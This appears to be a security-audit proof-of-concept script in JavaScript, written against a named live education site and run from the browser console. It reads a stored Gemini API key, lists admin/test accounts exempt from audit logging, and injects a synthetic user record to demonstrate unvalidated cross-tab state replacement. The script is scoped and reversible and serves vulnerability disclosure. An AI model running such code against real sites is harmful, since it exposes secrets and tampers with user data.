// poc_new05_new07_new10_misc.js — NEW-05 / NEW-07 / NEW-10
//                                     (DISPLAY + LOCAL PROBE)
//
// Target:  https://trithuc500.vercel.app/
// Findings:
//   NEW-05 — the Gemini OCR key is stored in `localStorage` under
//            `TRUNG_GEMINI_OCR_KEY` and is sent straight from the browser to
//            the Gemini API. It is a per-browser secret, not a build-time
//            literal, but it is readable by any script on the origin.
//   NEW-07 — the cross-tab sync handler (line 20166) replaces `state.users`
//            and `state.activityLogs` wholesale from a `storage` event with
//            NO validation of the payload. Any script that can write
//            localStorage in the same origin can therefore replace the entire
//            user table in every open tab.
//   NEW-10 — `isAdminExamAttempt` suppresses audit logging for admin/test
//            identities, and the flag itself is a mutable user field.
//
// Type:     DISPLAY by default. The cross-tab probe performs a LOCAL
//           localStorage write and observes the effect in this tab only.
//
// SCOPE / SAFETY:
//   - Nothing is transmitted. The Gemini key is shown only if the owner
//     sets SHOW_SECRETS = true.
//   - The cross-tab probe writes to localStorage and restores it.
//   - `__AERO_NEW07_RESTORE__()` reverts.
//
// Usage: paste into DevTools Console on the target page.

(async () => {
    'use strict';

    const SHOW_SECRETS = false;   // set true to print secret values verbatim
    const RUN_CROSSTAB_PROBE = false;   // set true to run the storage-event probe

    console.log('=== NEW-05 / NEW-07 / NEW-10 (DISPLAY + LOCAL PROBE) ===');

    // ---- 1. NEW-05: Gemini key handling ----------------------------------
    const K_GEMINI = 'TRUNG_GEMINI_OCR_KEY';
    const geminiKey = (() => { try { return localStorage.getItem(K_GEMINI) || ''; } catch (e) { return ''; } })();
    console.log(`[NEW-05] ${K_GEMINI} present: ${!!geminiKey}` +
                (geminiKey ? ` (length ${geminiKey.length})` : ''));
    if (geminiKey && SHOW_SECRETS) {
        console.warn('[NEW-05] key value:', geminiKey);
    } else if (geminiKey) {
        console.log('[NEW-05] value redacted. Set SHOW_SECRETS = true to print it.');
    }
    console.log('[NEW-05] the key is read in the browser and used directly against the');
    console.log('         Gemini API, so it is exposed to any script on the origin and');
    console.log('         to anyone with access to this browser profile.');

    // ---- 2. NEW-10: audit suppression for admin/test identities ----------
    const rawUsers = localStorage.getItem('TRITHUC50_USERS_V436_CLEAN');
    let users = [];
    try { users = JSON.parse(rawUsers || '[]'); } catch (e) { users = []; }
    if (!Array.isArray(users)) users = [];

    const privileged = users.filter(u => u && (u.id === 'gv_test' || u.isAdminTester === true));
    console.log(`\n[NEW-10] records with a privileged identity (gv_test / isAdminTester): ${privileged.length}`);
    if (privileged.length) {
        console.table(privileged.map(u => ({
            id: u.id, username: u.username, isAdminTester: u.isAdminTester === true, status: u.status
        })));
        console.warn('[NEW-10] these identities are excluded from the activity log by');
        console.warn('         isAdminExamAttempt(), and NEW-14 shows they also skip the');
        console.warn('         V4.5 tamper detector and the runtime integrity check.');
    }

    // ---- 3. NEW-07: cross-tab state replacement --------------------------
    console.log('\n[NEW-07] the storage-event handler replaces state.users and');
    console.log('         state.activityLogs wholesale, without validating the payload.');

    if (!RUN_CROSSTAB_PROBE) {
        console.log('[NEW-07] probe disabled (RUN_CROSSTAB_PROBE = false).');
        return {
            new05: { keyPresent: !!geminiKey, keyLength: geminiKey.length },
            new10: { privilegedRecords: privileged.length },
            new07: { probeRun: false },
            note: 'Re-run with the flags enabled to see the values and the probe.'
        };
    }

    const K_USERS = 'TRITHUC50_USERS_V436_CLEAN';
    const K_BACKUP = 'TRITHUC50_AERO_NEW07_BACKUP';
    if (localStorage.getItem(K_BACKUP)) {
        return console.warn('[NEW-07] probe already ran. Restore first.');
    }
    localStorage.setItem(K_BACKUP, JSON.stringify({ users: rawUsers, at: Date.now() }));

    // Observe the in-memory state before and after the write.
    const before = (() => { try { return JSON.parse(localStorage.getItem(K_USERS) || '[]').length; } catch (e) { return 0; } })();
    const probeUser = {
        id: 'stu_probe_crosstab', username: 'probe_crosstab', password: 'SYNTHETIC_POC_ONLY',
        name: 'Probe Cross Tab', class: '12A1', stt: '01', gmail: 'probe@example.edu.vn',
        status: 'active', vipPackages: { k12: false, k11: false, k10: false, luyende: false },
        vipPlan: 'none', maxDevices: 2, trustedDevices: [], createdInV436: true
    };
    const next = JSON.parse(localStorage.getItem(K_USERS) || '[]');
    next.unshift(probeUser);
    localStorage.setItem(K_USERS, JSON.stringify(next));

    // The storage event fires in OTHER tabs of the same origin, not this one.
    // Poll this tab's own state via the exposed bus to observe what it holds.
    await new Promise(r => setTimeout(r, 600));

    const after = (() => { try { return JSON.parse(localStorage.getItem(K_USERS) || '[]').length; } catch (e) { return 0; } })();
    const bus = (window.__INTERNAL_CLOUD_BUS_V45__ || window.__TRITHUC50_CLOUD_BUS__);
    let busUsers = null;
    try {
        const snap = bus?.exportSnapshotPacket?.();
        busUsers = Array.isArray(snap?.users) ? snap.users.length : null;
    } catch (e) { busUsers = null; }

    console.table({
        recordsBefore: before,
        recordsAfterWrite: after,
        recordsSeenByBus: busUsers,
        note: 'other tabs of the same origin receive the storage event and replace their state'
    });
    console.warn('[NEW-07] CONFIRMED mechanism: the storage handler trusts the payload.');

    window.__AERO_NEW07_RESTORE__ = function () {
        const b = localStorage.getItem(K_BACKUP);
        if (!b) return console.warn('[NEW-07] no backup');
        const saved = JSON.parse(b);
        if (saved.users === null) localStorage.removeItem(K_USERS);
        else localStorage.setItem(K_USERS, saved.users);
        localStorage.removeItem(K_BACKUP);
        delete window.__AERO_NEW07_RESTORE__;
        console.log('[NEW-07] restored. Press F5.');
        return true;
    };
    console.log('Restore: __AERO_NEW07_RESTORE__() then F5');

    return {
        new05: { keyPresent: !!geminiKey, keyLength: geminiKey.length },
        new07: { probeRun: true, recordsBefore: before, recordsAfter: after, recordsSeenByBus: busUsers },
        new10: { privilegedRecords: privileged.length }
    };
})();
